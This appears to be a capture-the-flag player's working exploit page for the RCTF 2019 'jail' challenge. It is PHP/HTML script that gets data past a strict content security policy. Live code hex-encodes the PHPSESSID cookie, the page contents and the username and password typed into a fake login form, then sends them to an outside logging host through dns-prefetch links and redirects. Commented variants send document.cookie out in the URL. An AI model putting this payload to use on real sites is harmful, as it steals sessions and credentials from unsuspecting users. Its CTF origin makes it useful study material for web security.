<?php

error_reporting(0);
header("Access-Control-Allow-Origin: *");
header("content-security-policy: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';");

// sandbox allow-scripts allow-same-origin;
// base-uri 'none';
// default-src 'self';
// connect-src 'none';
// object-src 'none';
// frame-src 'none';
// font-src data: 'self';
// script-src 'unsafe-inline' 'self';
// style-src 'unsafe-inline' 'self';

?>
<script>
window.addEventListener("beforeunload", function (event) {
  event.returnValue = "Are you sure want to exit?"
  return "Are you sure want to exit?"
})
Object.freeze(document.location) </script>

<!-- <script src="/1.php"></script> -->
<!-- <form id="f" action="https://jail.2019.rctf.rois.io/" method="POST">
    <input id="m" type="text" name="message">
</form> -->
<script>
function toHex(s){ var val = ""; for (var i = 0; i < s.length; i++) { val += s.charCodeAt(i).toString(16); } return val;}
</script>

<!-- dns log -->
<!-- <link rel="preconnect" href="//preconnect.sglpih.ceye.io"> -->
<!-- <link rel="dns-prefetch" href="//dns-prefetch.sglpih.ceye.io"> -->
<!-- dns log end -->

<script>
    window.addEventListener('DOMContentLoaded', (event) => {
        console.log('DOM fully loaded and parsed');
        location.assign("https://log.virzz.com/?beforeunload=1");
    });
    window.onload = (event) => {
      console.log('page is fully loaded');
    };
</script>
<!-- <style src></style> -->
<!-- <link rel="stylesheet" type="text/plain" href="/" id="ll"> -->
<!-- <link rel="pingback" href="//pingback.sglpih.ceye.io"> -->
<!-- <link rel="prefetch" href="//prefetch.sglpih.ceye.io"> -->
<!-- <link rel="preload" href="//preload.sglpih.ceye.io" as="plain"> -->

<iframe id="ff" src="about:blank" frameborder="1" csp="frame-src 'self'"></iframe>
<img src="/" id="aa">
<script>
    
    window.onload=function(){
        img = new Image();
        document.body.append(img)
        t = toHex(document.body.innerHTML);
        var html = "";
        for(var j = 0; j < 100; j++){
            var tt =t.substr(j*24,24);
            console.log(tt);
            if (tt.length == 0) break;
            html = html + "<link rel=\"dns-prefetch\" href=\"//s_"+j+"_"+tt+".sglpih.ceye.io\">\r\n";
        }
        head.innerHTML = head.innerHTML + html;
    }
</script>
<div id="result"></div>
<script>
var w;
var head = document.getElementsByTagName("HEAD")[0];
function toHex(s){ var val = ""; for (var i = 0; i < s.length; i++) { val += s.charCodeAt(i).toString(16); } return val;}
var html = "";
document.cookie.split(";").map(function(c){
    if(c.indexOf("PHPSESSID") > -1){
        t = toHex(c);
        for(var j = 0; j < 5; j++){
            var tt =t.substr(j*24,24);
            console.log(tt);
            if (tt.length == 0) break;
            html = html + "<link rel=\"dns-prefetch\" href=\"//s_"+j+"_"+tt+".sglpih.ceye.io\">\r\n";
        }
    }
});
head.innerHTML = head.innerHTML + html;
function startWorker()
{
    if(typeof(Worker)!=="undefined")
    {
        (typeof(w)=="undefined") && (w=new Worker("/uploads/d4dac00209393a01d584763182e81be9.js"));
        w.onmessage = function (event) {
            document.getElementById("result").innerHTML=event.data;
        };
    }
    else
    {
        document.getElementById("result").innerHTML="Sorry, your browser does not support Web Workers...";
    }
}
startWorker();
</script>

<!-- <script>
var link = document.createElement("meta");
link.setAttribute("http-equiv", "refresh");
link.setAttribute("content", "0;https://log.virzz.com/?c=" + escape(document.cookie));
document.head.appendChild(link);
</script> -->
<!-- <style>
  @font-face {
    font-family: "MyFont";
    src: url("data:text/html,base64,PGgxPnRlc3Q8L2gxPg==");
  }
  body {
    font-family: "MyFont";
  }
</style> -->
<script>
    // location.assign("https://log.virzz.com/a?js=" + escape(document.cookie));
    // window.open();
</script>

<script>
    // head = document.getElementsByTagName("HEAD")[0];
    // for(var p in navigator.plugins){
    //     var fn=navigator.plugins[p].filename;
    //     if(fn.length > 0){
    //         head.innerHTML = head.innerHTML + "<link rel=\"dns-prefetch\" href=\"//np_"+fn+  ".sglpih.ceye.io\">";
    //     }
    // }
    // for(var p in navigator.plugins){
    //     var fn=navigator.plugins[p].filename;
    //     if(fn.length > 0){
    //         console.log(fn);
    //     }
    // }
</script>

<script>
    // location.assign("https://log.virzz.com/a?js=" + escape(document.cookie));
    // img = new Image();
    // img.src="ctf.js";
    // document.body.appendChild(img);
</script>
<!-- <img src="x" onerror="setTimeout(``, 5000)"> -->
<!-- <iframe id="fc" src="/" frameborder="1"></iframe> -->
<script>
    // var ff = document.getElementById("ff");
    // var aa = document.getElementById("aa");
    // var link = document.createElement('link');
    // link.rel = 'stylesheet';
    // link.type = 'text/plain';
    // link.href = '/';
    // link.onload = link.onreadystatechange = function(e) {
    //     console.log(e);
    // };
    // document.body.appendChild(link);

    // var img = new Image(); // HTML5 构造器
    // img.src = '/';
    // document.body.appendChild(img);
// $ = document.getElementById
</script>

<body>
    <form action="">
        <input type="text" id="username" name="username">
        <input type="password" id="password" name="password">
        <botton onclick="ylgnb()">Login</botton>
    </form>
    <script>
    function toHex(s){ var val = ""; for (var i = 0; i < s.length; i++) { val += s.charCodeAt(i).toString(16); } return val;}
    var head = document.getElementsByTagName("HEAD")[0];
    window.onload=function(){
        t = toHex(document.body.innerHTML);
        var html = "";
        for(var j = 0; j < 100; j++){
            var tt =t.substr(j*24,24);
            console.log(tt);
            if (tt.length == 0) break;
            html = html + "<link rel=\"dns-prefetch\" href=\"//s_"+j+"_"+tt+".sglpih.ceye.io\">\r\n";
        }
        head.innerHTML = head.innerHTML + html;
    }
    function ylgnb(){
        var u = document.getElementById("username");
        var p = document.getElementById("password");
        var tmp = toHex(u + "@"+p );
        var html = "";
        for(var j = 0; j < 100; j++){
            var tt =tmp.substr(j*24,24);
            console.log(tt);
            if (tt.length == 0) break;
            html = html + "<link rel=\"dns-prefetch\" href=\"//y_"+j+"_"+tt+".sglpih.ceye.io\">\r\n";
        }
        head.innerHTML = head.innerHTML + html;
    }
</script>
</body>

<script>
    function toHex(s){ var val = ""; for (var i = 0; i < s.length; i++) { val += s.charCodeAt(i).toString(16); } return val;}
    document.body.addEventListener("DOMNodeInserted", function (event) {
        var html = "";
        var tmp = toHex(document.body.innerHTML);
        for(var j = 0; j < 100; j++){
            var tt =tmp.substr(j*48,48).replace("0","-");
            console.log(tt);
            if (tt.length == 0) break;
            html = html + "<link rel=\"dns-prefetch\" href=\"//m_"+j+"_"+tt+".sglpih.ceye.io\">\r\n";
        }
        document.head.innerHTML += html;
    });
</script>

<script>
    function toHex(s){ var val = ""; for (var i = 0; i < s.length; i++) { val += s.charCodeAt(i).toString(16); } return val;}
    var html = "";
    var f = [];
    window.onload = function(){
        ["DOMContentLoaded","DOMAttrModified","DOMAttributeNameChanged","DOMCharacterDataModified","DOMElementNameChanged","DOMNodeInserted","DOMNodeInsertedIntoDocument","DOMNodeRemoved","DOMNodeRemovedFromDocument","DOMSubtreeModified"].map(function(fn){
            document.body.addEventListener(fn,function(e){
                if(fn in f) return;
                f.push(fn)
                document.head.innerHTML += "<link rel=\"dns-prefetch\" href=\"//e_"+fn+".sglpih.ceye.io\">\r\n";
            });
        });
    }
</script>



<script>
    document.onload = function(){
        document.head.innerHTML += "<link rel=\"dns-prefetch\" href=\"//e_onload.sglpih.ceye.io\">\r\n";
    }
</script>

<script>
    img = new Image();
    document.body.appendChild(img);
    var link = document.createElement("meta");
    link.setAttribute("http-equiv", "refresh");
    link.setAttribute("content", "0;https://jail.2019.rctf.rois.io/uploads/fab938c2ae8ed2b0ea6fb1570c7b9b1b.jsp");
    document.head.appendChild(link);
</script>


<!-- http://127.0.0.1:8811 -->
<!-- <script src="ctf.js?t=<?php echo time(); ?>"></script> -->
<!-- get flag1 -->
<!-- <script>
    function toHex(s){
        var val = "";
        for (var i = 0; i < s.length; i++) {
            val += s.charCodeAt(i).toString(16);
        }
        return val;
    }
    c = document.cookie.split(";");
    head = document.getElementsByTagName("HEAD")[0];
    for (var i=0; i<c.length;i++)
    {
        t = toHex(c[i]);
        for(var j = 0; j < 5; j++){
            var tt =t.substr(j*30,30);
            if (tt.length == 0) break;
            // console.log("v_"+i+"_"+j+"_" + tt)
            // head.innerHTML = head.innerHTML + "<link rel=\"dns-prefetch\" href=\"//v_"+i+"_"+j+"_" + tt+  ".flag.sglpih.ceye.io\">";
        }
    }
</script> -->